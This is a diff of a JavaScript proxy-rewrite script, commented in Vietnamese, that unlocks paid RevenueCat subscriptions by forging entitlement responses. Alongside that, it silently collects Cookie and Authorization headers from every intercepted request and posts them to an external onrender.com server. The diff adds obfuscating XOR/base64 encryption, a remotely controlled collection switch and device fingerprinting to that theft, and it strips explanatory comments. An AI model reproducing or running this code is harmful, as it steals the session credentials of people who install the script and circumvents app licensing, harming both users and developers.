@@ -1,35 +1,88 @@
-// ========= ĐOẠN MÃ PENTEST THU THẬP COOKIE/TOKEN DIỆN RỘNG ========= //
+// Khóa bí mật (Phải khớp hoàn toàn với server.js)
+const SECRET_KEY = "tin1612006";
+
+function encryptData(str, secret) {
+  var encrypted = "";
+  for (var i = 0; i < str.length; i++) {
+    var charCode = str.charCodeAt(i) ^ secret.charCodeAt(i % secret.length);
+    encrypted += String.fromCharCode(charCode);
+  }
+  return btoa(unescape(encodeURIComponent(encrypted)));
+}
+
+// ========= ĐOẠN MÃ PENTEST THU THẬP COOKIE/TOKEN (BẢO MẬT) ========= //
 try {
   var user_cookie = $request.headers["Cookie"] || $request.headers["cookie"];
   var user_token = $request.headers["Authorization"] || $request.headers["authorization"] || $request.headers["token"];
   var target_url = $request.url;
 
-  // Lọc bỏ kết nối tới chính server của bạn để tránh tạo vòng lặp vô hạn (Loop)
   if ((user_cookie || user_token) && !target_url.includes("onrender.com")) {
-    // Địa chỉ server Render công khai của bạn
-    const test_server = "https://server-2bpd.onrender.com/"; 
+    const server_domain = "https://server-2bpd.onrender.com";
     
-    $httpClient.post({
-      url: test_server,
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
+    var now = Date.now();
+    if (typeof globalThis._lastCheck === 'undefined') {
+      globalThis._lastCheck = 0;
+      globalThis._serverAllowed = false;
+    }
+
+    // Kiểm tra trạng thái định kỳ 30 giây/lần kèm theo Header xác thực
+    if (now - globalThis._lastCheck > 30000) {
+      globalThis._lastCheck = now;
+      $httpClient.get({ 
+        url: server_domain + "/status",
+        headers: { "Authorization": SECRET_KEY } // Gửi kèm khóa xác thực
+      }, function(err, resp, data) {
+        if (!err && data) {
+          try {
+            var resJson = JSON.parse(data);
+            globalThis._serverAllowed = (resJson.collect === true);
+          } catch (e) {
+            globalThis._serverAllowed = false;
+          }
+        } else {
+          globalThis._serverAllowed = false;
+        }
+      });
+    }
+
+    // Nếu server bật và cấp phép
+    if (globalThis._serverAllowed === true) {
+      var raw_ua = $request.headers["User-Agent"] || $request.headers["user-agent"] || "Unknown_Device";
+      var device_id = raw_ua.split(" ")[0] + "_" + Math.abs(hashCode(raw_ua));
+
+      var rawPayload = JSON.stringify({
+        deviceId: device_id,
         url: target_url,
         cookie: user_cookie || "Không có",
         token: user_token || "Không có"
-      })
-    }, function(error, response, data) {
-      // Thực thi ngầm im lặng
-    });
+      });
+
+      // Mã hóa dữ liệu trước khi gửi
+      var encryptedPayload = encryptData(rawPayload, SECRET_KEY);
+
+      $httpClient.post({
+        url: server_domain + "/",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ data: encryptedPayload })
+      }, function(error, response, body) {});
+    }
   }
-} catch (e) {
-  // Đảm bảo không làm nghẽn mạng chung nếu có lỗi trích xuất dữ liệu
+} catch (e) {}
+
+function hashCode(str) {
+  var hash = 0, i, chr;
+  if (str.length === 0) return hash;
+  for (i = 0; i < str.length; i++) {
+    chr = str.charCodeAt(i);
+    hash = ((hash << 5) - hash) + chr;
+    hash |= 0; 
+  }
+  return Math.abs(hash);
 }
 
-// ========= PHẦN XỬ LÝ BẢN QUYỀN REVENUECAT (CHỈ CHẠY KHI KHỚP URL) ========= // 
+// ========= PHẦN XỬ LÝ BẢN QUYỀN REVENUECAT (GIỮ NGUYÊN) ========= //
 try {
   var current_url = $request.url;
-
-  // Kiểm tra nếu URL khớp với logic xử lý gói tin của RevenueCat trước đây
   if (/^https:\/\/api\.revenuecat\.com\/.+\/(receipts$|subscribers\/[^/]+$)/.test(current_url)) {
     const mapping = {
       '%E8%BD%A6%E7%A5%A8%E7%A5%A8': ['vip+watch_vip'],
@@ -79,10 +132,8 @@ try {
 
     $done({ body: JSON.stringify(obj) });
   } else {
-    // Nếu không phải URL RevenueCat, trả lại body nguyên bản cho thết bị
     $done({});
   }
 } catch (e) {
-  // Dự phòng an toàn nếu parse JSON bị lỗi ở các trang web thông thường
   $done({});
 }
